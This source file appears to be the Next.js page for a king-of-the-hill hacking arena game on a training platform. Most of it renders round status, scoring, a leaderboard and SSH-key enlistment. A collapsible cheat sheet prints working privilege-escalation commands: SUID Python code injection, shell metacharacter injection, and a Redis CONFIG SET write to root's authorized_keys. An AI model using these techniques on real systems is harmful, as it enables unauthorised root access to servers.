import Link from "next/link";
import { desc, eq } from "drizzle-orm";
import { getCurrentSession } from "@/lib/auth/session";
import { db } from "@/lib/db/client";
import { kothEvents, kothRounds, users } from "@/lib/db/schema";
import { findKeyForUser } from "@/lib/koth/keys";
import { topNForRound } from "@/lib/koth/scoring";
import { currentPricesForRound } from "@/lib/koth/paths";
import { submitKothKey } from "./actions";
import { RealtimeRefresh } from "./RealtimeRefresh";

export const dynamic = "force-dynamic";
export const revalidate = 0;

const ROUND_DURATION_SECONDS = 20 * 60;
const ARENA_HOST = "204.168.229.209";
const ARENA_PORT = 2300;
const ESCALATION_THRESHOLD_SECONDS = 300;

type EventMeta = { value_snapshot?: number };
function snapOf(raw: unknown): number | null {
  if (!raw || typeof raw !== "object") return null;
  const v = (raw as EventMeta).value_snapshot;
  return typeof v === "number" ? v : null;
}

function fmtDuration(seconds: number): string {
  const s = Math.max(0, seconds);
  const m = Math.floor(s / 60);
  const r = s % 60;
  return `${m}:${r.toString().padStart(2, "0")}`;
}

async function loadState() {
  const [round] = await db
    .select({ id: kothRounds.id, startedAt: kothRounds.startedAt })
    .from(kothRounds)
    .where(eq(kothRounds.status, "active"))
    .orderBy(desc(kothRounds.startedAt))
    .limit(1);

  if (!round) {
    return {
      round: null,
      king: null,
      top5: [],
      feed: [],
      paths: [] as Awaited<ReturnType<typeof currentPricesForRound>>,
      escalationEtaSec: null as number | null,
    };
  }

  const ageSeconds = Math.max(
    0,
    Math.floor((Date.now() - round.startedAt.getTime()) / 1000),
  );

  const [kingEvent] = await db
    .select({
      occurredAt: kothEvents.occurredAt,
      exploitPath: kothEvents.exploitPath,
      username: users.username,
    })
    .from(kothEvents)
    .leftJoin(users, eq(users.id, kothEvents.actorUserId))
    .where(eq(kothEvents.kind, "crown_taken"))
    .orderBy(desc(kothEvents.occurredAt))
    .limit(1);

  const king =
    kingEvent && kingEvent.username
      ? {
          username: kingEvent.username,
          since: kingEvent.occurredAt,
          holdSeconds: Math.max(
            0,
            Math.floor((Date.now() - kingEvent.occurredAt.getTime()) / 1000),
          ),
          exploitPath: kingEvent.exploitPath,
        }
      : null;

  const top5 = await topNForRound(round.id, 5);

  const feedRows = await db
    .select({
      occurredAt: kothEvents.occurredAt,
      kind: kothEvents.kind,
      exploitPath: kothEvents.exploitPath,
      actorUsername: users.username,
      rawMeta: kothEvents.rawMeta,
    })
    .from(kothEvents)
    .leftJoin(users, eq(users.id, kothEvents.actorUserId))
    .where(eq(kothEvents.roundId, round.id))
    .orderBy(desc(kothEvents.occurredAt))
    .limit(10);

  const feed = feedRows.map((r) => {
    const ts = r.occurredAt.toISOString().slice(11, 19);
    const actor = r.actorUsername ?? "unknown";
    const snap = snapOf(r.rawMeta);
    const v = snap != null ? ` (+${snap} pt)` : "";
    const path = r.exploitPath ? ` via ${r.exploitPath}${v}` : "";
    let line: string;
    switch (r.kind) {
      case "crown_taken":
        line = `${actor} took the crown${path}`;
        break;
      case "patched":
        line = `${actor} patched ${r.exploitPath ?? "an exploit"}`;
        break;
      case "path_patched_attributed":
        line = `${actor} closed ${r.exploitPath} (path-attributed +5)`;
        break;
      case "escalated":
        line = `escalation: new path open${path}`;
        break;
      case "path_activated":
        line = `new path opened: ${r.exploitPath ?? "?"}`;
        break;
      case "tutorial":
        line = `${actor} cleared the tutorial`;
        break;
      default:
        line = `${actor} ${r.kind}${path}`;
    }
    return { ts, line, kind: r.kind };
  });

  const paths = await currentPricesForRound(round.id);
  const escalationEtaSec =
    king && king.holdSeconds < ESCALATION_THRESHOLD_SECONDS
      ? ESCALATION_THRESHOLD_SECONDS - king.holdSeconds
      : null;

  return {
    round: {
      id: round.id,
      ageSeconds,
      remainingSeconds: Math.max(0, ROUND_DURATION_SECONDS - ageSeconds),
    },
    king,
    top5,
    feed,
    paths,
    escalationEtaSec,
  };
}

export const metadata = {
  title: "Crown Wars — Predator Arena · BreachLab",
};

export default async function KothPage({
  searchParams,
}: {
  searchParams: Promise<{ error?: string; registered?: string }>;
}) {
  const { user } = await getCurrentSession();
  const params = await searchParams;
  const state = await loadState();

  const myKey = user ? await findKeyForUser(user.id) : null;

  const corePaths = state.paths.filter((p) => p.kind === "core");
  const activeEscalation = state.paths.filter(
    (p) => p.kind === "escalation" && p.activated,
  );
  const pendingEscalation = state.paths.filter(
    (p) => p.kind === "escalation" && !p.activated && p.pendingUntil !== null,
  );

  return (
    <article className="space-y-5 max-w-3xl" data-testid="koth-page">
      <RealtimeRefresh intervalMs={3000} />

      {/* Hero */}
      <header className="space-y-2">
        <div className="text-[10px] text-amber/80 tracking-[0.4em] uppercase font-mono">
          ▸ predator arena
        </div>
        <h1 className="text-amber text-3xl sm:text-4xl phosphor wordmark font-bold tracking-[0.08em]">
          <span className="glitch" data-text="CROWN WARS">
            CROWN WARS
          </span>
        </h1>
      </header>

      {/* Help-bar — prominent Rules CTA. Right under the hero, before
          the round status banner, so eyes hit it on the way down. */}
      <div className="border border-amber/30 bg-amber/[0.03] px-4 py-3 flex items-center justify-between gap-3 flex-wrap">
        <div className="text-[13px] font-mono">
          <span className="text-muted">new here? </span>
          <span className="text-text">read the rules first.</span>
        </div>
        <Link
          href="/battles/koth/rules"
          className="btn-bracket text-amber text-[13px] font-mono tracking-[0.18em]"
        >
          Read the Rules →
        </Link>
      </div>

      {/* ─── Combined Arena Console ───────────────────────────────
          Round status strip (top) + enlist / SSH / sign-in (body).
          Border switches to green when the viewer is enlisted, giving
          a clear "you're in" identity signal across the whole console. */}
      <section
        className={`border ${
          myKey
            ? "border-green/40 bg-green/[0.03]"
            : "border-amber/40 bg-amber/[0.03]"
        }`}
      >
        {/* Round status strip */}
        <div
          className={`border-b ${
            myKey ? "border-green/20" : "border-amber/20"
          } px-4 py-2.5 flex items-center gap-3 flex-wrap text-[11px] font-mono tabular-nums`}
        >
          {state.round ? (
            <>
              <span className="flex items-center gap-2">
                <span className="pulse-dot text-green">●</span>
                <span className="text-muted uppercase tracking-widest">
                  round live
                </span>
              </span>
              <span className="text-amber">
                age {fmtDuration(state.round.ageSeconds)} / 20:00
              </span>
              <span className="text-muted">·</span>
              <span className="text-text">
                resets in {fmtDuration(state.round.remainingSeconds)}
              </span>
              <span className="text-muted">·</span>
              {state.king ? (
                <span className="text-green">
                  king: {state.king.username} ·{" "}
                  {fmtDuration(state.king.holdSeconds)}
                </span>
              ) : (
                <span className="text-muted">crown vacant</span>
              )}
              {state.escalationEtaSec !== null && state.king && (
                <>
                  <span className="text-muted">·</span>
                  <span className="text-red-400">
                    escalation in {fmtDuration(state.escalationEtaSec)}
                  </span>
                </>
              )}
              {pendingEscalation.length > 0 && (
                <>
                  <span className="text-muted">·</span>
                  <span className="text-red-400 animate-pulse">
                    ⚠ incoming: {pendingEscalation.map((p) => p.slug).join(", ")}
                  </span>
                </>
              )}
            </>
          ) : (
            <span className="text-muted">
              arena resetting · no active round
            </span>
          )}
        </div>

        {/* Body — three states: unsigned / enlisted / sign-in-but-no-key */}
        {!user ? (
          <div className="px-4 py-3 space-y-2">
            <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase font-mono">
              ▸ enlist
            </div>
            <p className="text-[13px] text-text">
              Sign in to register your SSH key and claim a slot in the arena.
            </p>
            <Link
              href="/login?next=/battles/koth"
              className="btn-bracket text-amber text-[12px] font-mono"
            >
              Sign in to enlist
            </Link>
          </div>
        ) : myKey ? (
          <div className="px-4 py-3 space-y-2">
            <div className="flex items-center justify-between gap-3 flex-wrap">
              <div className="flex items-center gap-2 text-[10px] tracking-[0.3em] uppercase font-mono">
                <span className="text-green/80">
                  ▸ enlisted · slot koth{myKey.slot}
                </span>
                {myKey.tutorialCompletedAt ? (
                  <span className="border border-amber/60 text-amber bg-amber/5 px-1 py-0">
                    veteran
                  </span>
                ) : (
                  <span className="border border-muted/60 text-muted bg-bg px-1 py-0">
                    rookie · first crown unlocks
                  </span>
                )}
              </div>
              <span className="text-[10px] text-muted font-mono tabular-nums">
                {myKey.fingerprint.slice(0, 22)}…
              </span>
            </div>
            <pre className="text-[12px] leading-relaxed text-text overflow-x-auto">
{`ssh -i ~/.ssh/your_key -p ${ARENA_PORT} koth${myKey.slot}@${ARENA_HOST}`}
            </pre>
            <p className="text-[11px] text-muted leading-snug">
              Once inside: get root via the SUID paths or Redis, then
              <code className="ml-1">
                crown-claim koth{myKey.slot} &lt;exploit&gt;
              </code>{" "}
              to claim the throne.
            </p>

            {/* Exploit cheat sheet — collapsible, native <details>, no JS */}
            <details className="text-[12px] font-mono pt-1.5 border-t border-green/20 mt-2">
              <summary className="cursor-pointer text-amber hover:text-amber/80 select-none py-1 tracking-wider">
                ▸ exploit cheat sheet · open at your own risk
              </summary>
              <div className="space-y-3 pt-2 pb-1">
                <div className="space-y-1">
                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
                    L7 — phantom-python3 SUID · argv code injection
                  </div>
                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
{`/usr/local/bin/phantom-python3 -c \\
  'import os; os.system("crown-claim koth${myKey.slot} l7-suid")'`}
                  </pre>
                </div>
                <div className="space-y-1">
                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
                    L8 — system-checker SUID · shell metachar injection
                  </div>
                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
{`/usr/local/bin/system-checker \\
  '127.0.0.1; crown-claim koth${myKey.slot} l8-suid'`}
                  </pre>
                </div>
                <div className="space-y-1">
                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
                    L17 — Redis CONFIG SET · write to /root/.ssh/authorized_keys
                  </div>
                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto whitespace-pre">
{`ssh-keygen -t ed25519 -f /tmp/k -N ''
KEY=$(cat /tmp/k.pub)
redis-cli <<EOF
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET x "\\n\\n$KEY\\n\\n"
SAVE
EOF
ssh -i /tmp/k -o StrictHostKeyChecking=no root@localhost \\
  "crown-claim koth${myKey.slot} l17-redis"`}
                  </pre>
                </div>
                <p className="text-[10px] text-muted leading-snug pt-1">
                  These work today. The box mutates against playbooks —
                  defenders close paths after they&apos;re used. Real opsec
                  means reading <code className="mx-1">/var/log/auth.log</code>
                  and adapting in real time, not copy-paste forever.
                </p>
              </div>
            </details>
          </div>
        ) : (
          <div className="px-4 py-3 space-y-3">
            <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase font-mono">
              ▸ enlist — register your SSH key
            </div>
            {params.error && (
              <div className="text-[12px] text-red-400 font-mono border border-red-400/40 bg-red-400/5 px-2 py-1">
                ✗ {params.error}
              </div>
            )}
            {params.registered === "1" && (
              <div className="text-[12px] text-green font-mono border border-green/40 bg-green/5 px-2 py-1">
                ✓ key registered — slot assigned above
              </div>
            )}
            <form action={submitKothKey} className="space-y-2">
              <label
                htmlFor="pubkey"
                className="block text-[11px] text-muted uppercase tracking-widest font-mono"
              >
                public key (one line — ssh-ed25519 preferred)
              </label>
              <textarea
                id="pubkey"
                name="pubkey"
                rows={3}
                required
                placeholder="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... your@host"
                className="w-full bg-bg border border-amber/30 px-3 py-2 text-[12px] font-mono text-text resize-y focus:outline-none focus:border-amber"
              />
              <div className="flex items-center justify-between gap-3 flex-wrap">
                <span className="text-[10px] text-muted">
                  generate with <code>ssh-keygen -t ed25519</code> · paste the
                  .pub
                </span>
                <button
                  type="submit"
                  className="btn-bracket text-amber text-[12px] font-mono"
                >
                  Enlist in Arena
                </button>
              </div>
            </form>
          </div>
        )}
      </section>

      {/* Commodity HUD — Phase 2 Diamond pricing */}
      <section className="border border-amber/30 px-4 py-3 space-y-3">
        <div className="flex items-center justify-between gap-3 flex-wrap">
          <h2 className="text-amber text-sm font-mono tracking-[0.18em] uppercase">
            ▸ exploit market
          </h2>
          <span className="text-[10px] text-muted font-mono uppercase tracking-widest">
            diamond pricing · –2 pt / exploit · floor 2
          </span>
        </div>

        {/* Core paths — always live */}
        {corePaths.length > 0 && (
          <div className="space-y-1.5">
            <div className="text-[10px] text-green/70 font-mono uppercase tracking-widest">
              ▾ core · always open
            </div>
            <ul className="space-y-1 text-[12px] font-mono">
              {corePaths.map((p) => {
                const discounted = p.currentValue < p.baseValue;
                return (
                  <li key={p.slug} className="flex items-center gap-3">
                    <span className="text-amber tabular-nums w-6 text-right">
                      {p.currentValue}
                    </span>
                    <span className="text-muted text-[10px] w-6">pt</span>
                    <span className="text-text flex-1 truncate">
                      {p.name} <span className="text-muted">· {p.slug}</span>
                    </span>
                    {discounted ? (
                      <span className="text-muted text-[10px] tabular-nums">
                        ↓ from {p.baseValue} · {p.exploitsThisRound}×
                      </span>
                    ) : (
                      <span className="text-green/60 text-[10px] tabular-nums">
                        base
                      </span>
                    )}
                  </li>
                );
              })}
            </ul>
          </div>
        )}

        {/* Active escalation paths */}
        {activeEscalation.length > 0 ? (
          <div className="space-y-1.5 pt-2 border-t border-amber/15">
            <div className="text-[10px] text-amber/80 font-mono uppercase tracking-widest">
              ▾ escalation · live in this round
            </div>
            <ul className="space-y-1 text-[12px] font-mono">
              {activeEscalation.map((p) => {
                const discounted = p.currentValue < p.baseValue;
                return (
                  <li key={p.slug} className="flex items-center gap-3">
                    <span className="text-amber tabular-nums w-6 text-right">
                      {p.currentValue}
                    </span>
                    <span className="text-muted text-[10px] w-6">pt</span>
                    <span className="text-text flex-1 truncate">
                      {p.name} <span className="text-muted">· {p.slug}</span>
                    </span>
                    {discounted ? (
                      <span className="text-muted text-[10px] tabular-nums">
                        ↓ from {p.baseValue} · {p.exploitsThisRound}×
                      </span>
                    ) : (
                      <span className="text-amber/60 text-[10px] tabular-nums">
                        new
                      </span>
                    )}
                  </li>
                );
              })}
            </ul>
            {myKey && (
              <p className="text-[10px] text-muted leading-snug pt-1">
                Hints for each path live in the rules · exploit inside
                your kothN shell, then
                <code className="mx-1">
                  crown-claim koth{myKey.slot} &lt;slug&gt;
                </code>
                to claim via that path.
              </p>
            )}
          </div>
        ) : (
          <p className="text-[11px] text-muted leading-snug pt-1">
            no escalation paths live yet · the arena opens a new path
            when the crown is held past 5 minutes
          </p>
        )}
      </section>

      {/* Top-5 leaderboard */}
      <section className="border border-border/60 px-4 py-3 space-y-2">
        <h2 className="text-amber text-sm font-mono tracking-[0.18em] uppercase">
          ▸ top operators (this round)
        </h2>
        {state.top5.length === 0 ? (
          <p className="text-[12px] text-muted font-mono">
            no scoring yet — first crown grab will appear here
          </p>
        ) : (
          <ol className="space-y-1 text-[12px] font-mono tabular-nums">
            {state.top5.map((row, i) => (
              <li key={row.userId} className="flex items-center gap-3">
                <span className="text-amber w-4">{i + 1}.</span>
                <span className="text-text flex-1 truncate">{row.username}</span>
                <span className="text-amber w-12 text-right">{row.points} pt</span>
                <span className="text-muted text-[10px] w-20 text-right">
                  {row.dethrones}d / {row.patches}p
                </span>
              </li>
            ))}
          </ol>
        )}
      </section>

      {/* Kill-feed */}
      <section className="border border-border/60 px-4 py-3 space-y-2">
        <h2 className="text-amber text-sm font-mono tracking-[0.18em] uppercase">
          ▸ kill feed
        </h2>
        {state.feed.length === 0 ? (
          <p className="text-[12px] text-muted font-mono">
            waiting for the first claim…
          </p>
        ) : (
          <ul className="space-y-1 text-[12px] font-mono leading-relaxed">
            {state.feed.map((ev, i) => (
              <li key={i} className="flex gap-3">
                <span className="text-amber/70 tabular-nums w-16">{ev.ts}</span>
                <span className="text-text flex-1">{ev.line}</span>
              </li>
            ))}
          </ul>
        )}
      </section>

      <footer className="pt-3 border-t border-border/40 flex items-center justify-between text-xs text-muted font-mono gap-3 flex-wrap">
        <Link href="/battles" className="hover:text-amber tracking-[0.18em] uppercase">
          ← battles
        </Link>
        <div className="flex items-center gap-3">
          <Link href="/battles/koth/history" className="hover:text-amber tracking-[0.18em] uppercase">
            history
          </Link>
          <Link href="/battles/koth/rules" className="hover:text-amber tracking-[0.18em] uppercase">
            rules →
          </Link>
        </div>
        <span className="tracking-[0.18em] uppercase">predator · phase 2</span>
      </footer>
    </article>
  );
}
